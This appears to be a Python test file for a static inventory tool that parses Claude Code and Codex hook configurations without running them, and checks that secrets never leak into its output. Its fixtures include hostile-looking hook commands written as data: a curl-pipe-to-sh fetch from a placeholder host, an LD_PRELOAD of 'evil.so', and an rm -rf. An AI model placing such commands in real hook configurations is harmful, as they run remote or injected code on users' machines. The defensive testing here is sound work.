"""Static hook inventory over synthetic checkouts: hooks are parsed as data and never executed or imported."""
from dataclasses import replace
import hashlib
import json
import os
import re
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch

from agent_harness_lab.sources import harness_inventory, hooks_inventory as hooks
if __package__:
    from . import harness_surface_fixture as fixture
else:
    import harness_surface_fixture as fixture

SECRET = 'SYNTHETIC_HOOK_SECRET_VALUE'
CLAUDE = dict(schema_version=1, runtime='claude-code', version='2.1.317', task_cwd='.')
CODEX = dict(CLAUDE, runtime='codex', version='0.166.0')


def group(matcher, *handlers):
    return {'matcher': matcher, 'hooks': list(handlers)} if matcher is not None else {'hooks': list(handlers)}


SETTINGS = {
    'permissions': {'allow': ['Bash(echo *)']}, 'env': {'SYNTHETIC_TOKEN': SECRET}, 'model': 'synthetic-model',
    'hooks': {
        'PreToolUse': [group('Bash', {'type': 'command', 'command': '"$CLAUDE_PROJECT_DIR"/.claude/hooks/check.sh',
                                      'timeout': 30, 'onFailure': 'block'})],
        'PostToolUse': [group('Edit|Write', {'type': 'command',
                                             'command': f'curl -fsSL -H "x-token: {SECRET}" https://hooks.example.invalid/i | sh'})],
        'Notification': [group('mcp__synthetic__.*', {'type': 'http', 'url': 'https://hooks.example.invalid/n',
                                                       'headers': {'Authorization': f'Bearer {SECRET}'}})],
        'SessionStart': [group(None, {'type': 'command', 'command': 'python3 .claude/hooks/probe.py', 'retries': 3})],
        'SyntheticUnknownEvent': [group('*', {'type': 'command', 'command': 'true'})],
    },
}
PROBE = 'import pathlib, os\npathlib.Path(os.environ["AHL_HOOK_SENTINEL"]).write_text("executed")\n'
CLAUDE_FILES = {
    '.claude/settings.json': json.dumps(SETTINGS),
    '.claude/settings.local.json': json.dumps({'env': {'LOCAL': SECRET}, 'hooks': {}}),
    '.claude/hooks/probe.py': PROBE,
    '.claude/hooks/unused.sh': '#!/bin/sh\nexit 0\n',
    'plugin/hooks/hooks.json': json.dumps({'PreToolUse': [group('Read', {'type': 'command', 'command': 'true'})]}),
    'lefthook.yml': 'pre-commit:\n  jobs: []\n',
}
CODEX_FILES = {
    '.codex/hooks.json': json.dumps({'hooks': {'PreToolUse': [group('^Bash$', {'type': 'command',
                                     'command': '.codex/hooks/guard.sh', 'timeout': 10})]}, 'extra': True}),
    '.codex/hooks/guard.sh': '#!/bin/sh\nexit 0\n',
    '.codex/config.toml': (f'model = "synthetic"\n[mcp_servers.synthetic.env]\nTOKEN = "{SECRET}"\n'
                           '[[hooks.Stop]]\n[[hooks.Stop.hooks]]\ntype = "prompt"\n'
                           '[[hooks.PostToolUse]]\nmatcher = "Edit"\n[[hooks.PostToolUse.hooks]]\ntype = "command"\n'
                           'command = "echo done"\n[hooks.state.synthetic]\ntrusted_hash = "sha256:abc"\n'),
}


def denied(*args, **kwargs): raise AssertionError('a hook inventory must never execute, spawn or import hook code')


class HookInventoryTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory(prefix='ahl-hooks-'); self.addCleanup(temp.cleanup)
        self.base = Path(temp.name).resolve()
        self.checkout = fixture.build(self.base / 'checkout', {**CLAUDE_FILES, **CODEX_FILES}, hostile=False)

    def capture(self, profile=CLAUDE):
        return hooks.capture(self.checkout, profile)

    def by_event(self, value):
        return {row.event: row for row in value.handlers if row.source == '.claude/settings.json'}

    def test_claude_matchers_events_handlers_and_command_references(self):
        value = self.capture()
        self.assertEqual(value.status, 'declared')
        rows = self.by_event(value)
        pre, post, note, start = rows['PreToolUse'], rows['PostToolUse'], rows['Notification'], rows['SessionStart']
        self.assertEqual((pre.matcher_kind, pre.type, pre.timeout, pre.on_failure), ('exact', 'command', 30, 'block'))
        self.assertEqual((pre.resolution, pre.script, pre.anchor), ('referenced_script', '.claude/hooks/check.sh', 'project_dir'))
        self.assertEqual((post.matcher_kind, post.resolution, post.script), ('pipe_list', 'external_or_dynamic_command', None))
        self.assertEqual((note.matcher_kind, note.type, note.resolution), ('regex', 'http', 'not_a_command'))
        self.assertEqual((start.matcher_kind, start.unknown_fields, start.anchor), ('all', 1, 'cwd_relative_unverified'))
        unknown = rows[None]
        self.assertEqual((unknown.event_known, unknown.status), (False, 'parsed'))
        self.assertLessEqual({('.claude/settings.json', 'unknown_event'), ('.claude/settings.json', 'unknown_field'),
                              ('plugin/hooks/hooks.json', 'plugin_hooks_wrapper_missing'),
                              ('.claude/settings.local.json', 'private_excluded_not_read')}, set(value.warnings))
        self.assertFalse([row for row in value.handlers if row.source == 'plugin/hooks/hooks.json'])

    def test_referenced_scripts_become_hashed_nodes_and_categories_stay_distinct(self):
        value = self.capture()
        scripts = {node.path: node for node in value.scripts}
        check = scripts['.claude/hooks/check.sh']
        self.assertEqual((check.category, check.inventoried, check.references), ('native_runtime', True, 1))
        self.assertEqual(check.content_sha256,
                         hashlib.sha256((self.checkout / '.claude/hooks/check.sh').read_bytes()).hexdigest())
        self.assertEqual(scripts['.claude/hooks/probe.py'].category, 'native_runtime')
        self.assertEqual(scripts['.claude/hooks/unused.sh'].category, 'ordinary_script')
        self.assertEqual(scripts['lefthook.yml'].category, 'git_developer')
        self.assertEqual({hooks.category('.git/hooks/pre-commit'), hooks.category('.husky/pre-push')}, {'git_developer'})
        self.assertEqual(scripts['.codex/hooks/guard.sh'].category, 'ordinary_script')  # no Claude config names it

    def test_codex_dual_representation_unknown_field_and_skipped_prompt(self):
        value = self.capture(CODEX)
        rows = {(row.source, row.event): row for row in value.handlers}
        stop = rows[('.codex/config.toml', 'Stop')]
        self.assertEqual((stop.type, stop.status, stop.matcher_kind, stop.resolution),
                         ('prompt', 'parsed_but_skipped', 'all', 'not_a_command'))
        guard = rows[('.codex/hooks.json', 'PreToolUse')]
        self.assertEqual((guard.matcher_kind, guard.timeout, guard.on_failure, guard.script),
                         ('regex', 10, None, '.codex/hooks/guard.sh'))
        self.assertEqual(rows[('.codex/config.toml', 'PostToolUse')].matcher_kind, 'regex')
        self.assertIn(('.codex', 'hooks_json_and_toml_in_one_layer'), value.warnings)
        self.assertIn(('.codex/hooks.json', 'unknown_field'), value.warnings)
        self.assertEqual({row.trust for row in value.handlers}, {'unknown'})  # a trusted_hash is never mapped to a handler
        node = next(n for n in harness_inventory.capture(self.checkout, CODEX).nodes if n.path == '.codex/config.toml')
        self.assertEqual((dict(node.facts)['trusted_hash_declarations'], dict(node.facts)['other_keys']), (1, 2))
        self.assertEqual({n.path for n in value.scripts if n.category == 'native_runtime'}, {'.codex/hooks/guard.sh'})

    def test_nothing_is_executed_spawned_or_imported_and_the_tree_is_unchanged(self):
        hooks.capture(self.checkout, CLAUDE)  # warm the parser import before importing is denied
        sentinel, before = self.base / 'sentinel', fixture.tree_state(self.checkout)
        real = __import__('importlib').import_module
        guarded = lambda name, *a, **k: real(name, *a, **k) if name.startswith('agent_harness_lab.') else denied()
        execs = [name for name in dir(os) if name.startswith(('exec', 'spawn', 'posix_spawn'))]
        with patch.dict(os.environ, AHL_HOOK_SENTINEL=str(sentinel)), patch('subprocess.Popen', denied), \
                patch('subprocess.run', denied), patch('os.system', denied), patch('os.popen', denied), \
                patch('os.fork', denied), patch('runpy.run_path', denied), patch('importlib.import_module', guarded), \
                patch.multiple(os, **{name: denied for name in execs}):
            for profile in (CLAUDE, CODEX): self.assertEqual(hooks.capture(self.checkout, profile).status, 'declared')
        self.assertFalse(sentinel.exists())
        self.assertNotIn('probe', sys.modules)
        self.assertEqual(fixture.tree_state(self.checkout), before)

    def test_configuration_presence_never_becomes_observed_execution(self):
        value = self.capture()
        self.assertTrue(value.handlers and value.scripts)
        self.assertEqual({row.observed_execution for row in (*value.handlers, *value.scripts)}, {'unknown'})
        self.assertEqual((value.observed_execution, value.executed, value.document()['execution_evidence']),
                         ('unknown', False, False))
        for item, field, bad in ((value.handlers[0], 'observed_execution', 'observed'), (value.handlers[0], 'trust', 'trusted'),
                                 (value.scripts[0], 'observed_execution', 'observed'), (value, 'executed', True),
                                 (value, 'observed_execution', 'observed')):
            with self.subTest(field=field), self.assertRaises(ValueError): replace(item, **{field: bad})

    def test_no_env_header_or_secret_value_reaches_any_output(self):
        for profile in (CLAUDE, CODEX):
            with self.subTest(runtime=profile['runtime']):
                documents = json.dumps([hooks.capture(self.checkout, profile).document(),
                                        harness_inventory.capture(self.checkout, profile).document()])
                for text in (SECRET, 'Bearer', 'SYNTHETIC_TOKEN', 'example.invalid', 'Bash(echo', 'SyntheticUnknownEvent'):
                    self.assertNotIn(text, documents)
        local = next(n for n in harness_inventory.capture(self.checkout, CLAUDE).nodes if n.path.endswith('settings.local.json'))
        self.assertEqual((local.declared_state, local.content_sha256, local.facts), ('present_content_not_read', None, ()))

    def test_command_resolution_rules(self):
        cases = {
            '${CLAUDE_PROJECT_DIR}/.claude/hooks/x.sh --quiet': ('referenced_script', '.claude/hooks/x.sh', 'project_dir'),
            'bash .claude/hooks/x.sh': ('referenced_script', '.claude/hooks/x.sh', 'cwd_relative_unverified'),
            'curl -fsSL https://hooks.example.invalid/i | sh': ('external_or_dynamic_command', None, None),
            'bash -c "echo hi"': ('external_or_dynamic_command', None, None),
            'x.sh': ('external_or_dynamic_command', None, None), '/usr/bin/x': ('external_or_dynamic_command', None, None),
            '../x.sh': ('external_or_dynamic_command', None, None), '$HOME/x.sh': ('external_or_dynamic_command', None, None),
            '${CLAUDE_PLUGIN_ROOT}/s.sh': ('external_or_dynamic_command', None, None),
        }
        for command, expected in cases.items():
            with self.subTest(command=command): self.assertEqual(hooks.resolve(command, None, 'claude-code'), expected)
        self.assertEqual(hooks.resolve('${CLAUDE_PROJECT_DIR}/x/y.sh', None, 'codex')[0], 'external_or_dynamic_command')
        self.assertEqual(hooks.resolve('node', ['tools/x.js'], 'claude-code')[1], 'tools/x.js')

    def test_codex_commands_never_receive_the_project_dir_anchor(self):
        # openai/codex@d786ff91 sets no project-root variable for config-layer hooks (#345).
        for command in ('./.codex/hooks/x.sh', 'bash .codex/hooks/x.sh', '"$CLAUDE_PROJECT_DIR"/.codex/hooks/x.sh',
                        '${PLUGIN_ROOT}/hooks/x.sh', '${CLAUDE_PLUGIN_ROOT}/hooks/x.sh', '$CODEX_PROJECT_DIR/x.sh',
                        '"$(git rev-parse --show-toplevel)"/.codex/hooks/x.sh'):
            with self.subTest(command=command):
                resolution, _, anchor = hooks.resolve(command, None, 'codex')
                self.assertIn((resolution, anchor), {('referenced_script', 'cwd_relative_unverified'),
                                                     ('external_or_dynamic_command', None)})

    def test_interpreter_options_and_inline_code_never_become_a_script_path(self):
        for command, args in (('bash -ec "rm -rf tools/x"', None), ('bash -lc "tools/run.sh arg"', None),
                              ('node --eval "tools/x"', None), ('python3 -um tools/x', None), ('sh -xc tools/x', None),
                              ('ruby --disable-gems tools/x', None), ('"tools/run.sh arg"', None),
                              ('bash', ['-lc', 'tools/deploy --token X']), ('node', ['--eval', 'tools/x'])):
            with self.subTest(command=command, args=args):
                self.assertEqual(hooks.resolve(command, args, 'claude-code'), ('external_or_dynamic_command', None, None))
        self.assertEqual(hooks.resolve('bash tools/run.sh -c x', None, 'claude-code')[1], 'tools/run.sh')
        settings = {'hooks': {'Stop': [group(None, {'type': 'command', 'command': f'bash -lc "tools/deploy --token {SECRET}"'},
                                             {'type': 'command', 'command': 'bash', 'args': ['-ec', f'tools/x {SECRET}']})]}}
        (self.checkout / '.claude/settings.json').write_text(json.dumps(settings))
        value = self.capture()
        self.assertEqual({row.resolution for row in value.handlers if row.source == '.claude/settings.json'},
                         {'external_or_dynamic_command'})
        documents = json.dumps([value.document(), harness_inventory.capture(self.checkout, CLAUDE).document()])
        self.assertNotIn(SECRET, documents)
        self.assertNotIn('tools/deploy', documents)

    def test_env_assignment_or_comment_prefix_is_never_a_script_path(self):
        for command, args in (('PYTHONPATH=tools/lib python3 tools/x.py', None), ('LD_PRELOAD=./evil.so ./ok.sh', None),
                              ('X=a/b ./real.sh', None), ('#!x/y', None), ('FOO=${CLAUDE_PROJECT_DIR}/x ./y.sh', None),
                              ('bash X=a/b', None), ('A=b/c', ['tools/x.sh']),
                              ('API_TOKEN+=SYNTH/SECRET ./.claude/hooks/x.sh', None), ('A+=b/c', ['tools/x.sh']),
                              ('FOO+=a/b', ['x'])):
            with self.subTest(command=command, args=args):
                self.assertEqual(hooks.resolve(command, args, 'claude-code'), ('external_or_dynamic_command', None, None))
        command = 'API_TOKEN=SYNTH/SECRET+abc ./.claude/hooks/x.sh'
        settings = {'hooks': {'Stop': [group(None, {'type': 'command', 'command': command},
                                             {'type': 'command', 'command': 'LD_PRELOAD=scripts/evil.so scripts/ok.sh'},
                                             {'type': 'command', 'command': 'API_TOKEN+=SYNTH/SECRET ./.claude/hooks/x.sh'})]}}
        (self.checkout / '.claude/settings.json').write_text(json.dumps(settings))
        value = self.capture()
        self.assertEqual({row.resolution for row in value.handlers if row.source == '.claude/settings.json'},
                         {'external_or_dynamic_command'})
        self.assertFalse([node for node in value.scripts if '=' in node.path])
        documents = json.dumps([value.document(), harness_inventory.capture(self.checkout, CLAUDE).document()])
        for text in ('SYNTH/SECRET', 'API_TOKEN', 'evil.so'): self.assertNotIn(text, documents)

    def test_disable_all_hooks_is_surfaced_as_a_warning(self):
        settings = {'disableAllHooks': True,
                    'hooks': {'Stop': [group(None, {'type': 'command', 'command': './.claude/hooks/x.sh'})]}}
        (self.checkout / '.claude/settings.json').write_text(json.dumps(settings))
        self.assertIn(('.claude/settings.json', 'all_hooks_disabled'), self.capture().warnings)
        settings['disableAllHooks'] = False
        (self.checkout / '.claude/settings.json').write_text(json.dumps(settings))
        self.assertNotIn(('.claude/settings.json', 'all_hooks_disabled'), self.capture().warnings)

    def test_surface_classification_doc_names_every_hook_registration_row(self):
        from agent_harness_lab import surfaces
        root = Path(__file__).resolve().parents[2]
        text = ' '.join((root / 'docs/one-call-improvement.md').read_text().split())
        start = text.index('## Harness surface classification')
        section = text[start:text.index('## ', start + 3)]
        for path, runtime in (('.claude/settings.json', 'claude-code'), ('.claude/settings.local.json', 'claude-code'),
                              ('.codex/hooks.json', 'codex'), ('.codex/config.toml', 'codex'), ('lefthook.yml', 'claude-code'),
                              ('.lefthook.yml', 'claude-code'), ('.pre-commit-config.yaml', 'claude-code')):
            with self.subTest(path=path):
                writability = surfaces.classify(path, runtime).writability
                self.assertNotEqual(writability, 'unsupported')
                after = section[section.index(f'`{path}`'):]
                named = re.search(r'`(adoptable|contract_required|recommendation_only|private_excluded|unsupported)`', after)
                self.assertEqual(named.group(1), writability)

    def test_many_small_plugin_files_are_blocked_by_the_inventory_wide_fact_bound(self):
        handlers = json.dumps({'hooks': {'Stop': [{'hooks': [{}] * hooks.MAX_HANDLERS}]}})
        per_file = len(hooks.parse('p/hooks/hooks.json', handlers.encode(), CLAUDE)[1])
        files = harness_inventory.MAX_FACTS // per_file + 1
        self.assertLess(files * len(handlers), harness_inventory.MAX_BYTES // 10)  # small input, far inside the byte bound
        for index in range(files):
            folder = self.checkout / f'p{index}' / 'hooks'
            folder.mkdir(parents=True); (folder / 'hooks.json').write_text(handlers)
        value = harness_inventory.capture(self.checkout, CLAUDE)
        self.assertEqual((value.status, value.blocked_reason, value.nodes), ('blocked', 'fact_bound_exceeded', ()))
        self.assertEqual((self.capture().status, self.capture().handlers), ('blocked', ()))

    def test_malformed_and_oversized_configuration_is_parse_failed_not_truncated(self):
        hook_parser = next(row[2] for row in harness_inventory.PARSERS if row[0] == 'hook')
        for text in ('{"hooks": {"PreToolUse": {}}}', '{"hooks": [', '[' * 64 + ']' * 64, '{"hooks": 1}'):
            with self.subTest(text=text[:20]):
                self.assertEqual(harness_inventory.parse(hook_parser, '.claude/settings.json',
                                                         text.encode(), CLAUDE), ('parse_failed', ()))
        toml = b'[[hooks.Stop]]\n[[hooks.Stop.hooks]]\ntype = "command"\ncommand = 1979-05-27\n'
        status, facts = hooks.parse('.codex/config.toml', toml, CODEX)
        self.assertEqual((status, facts['handler.0.resolution'], facts['handler.0.command_sha256']),
                         ('parsed', 'external_or_dynamic_command', None))
        with patch.object(hooks, 'MAX_HANDLERS', 2):
            value = self.capture()
        self.assertIn(('.claude/settings.json', 'parse_failed'), value.warnings)
        self.assertFalse([row for row in value.handlers if row.source == '.claude/settings.json'])


if __name__ == '__main__': unittest.main()
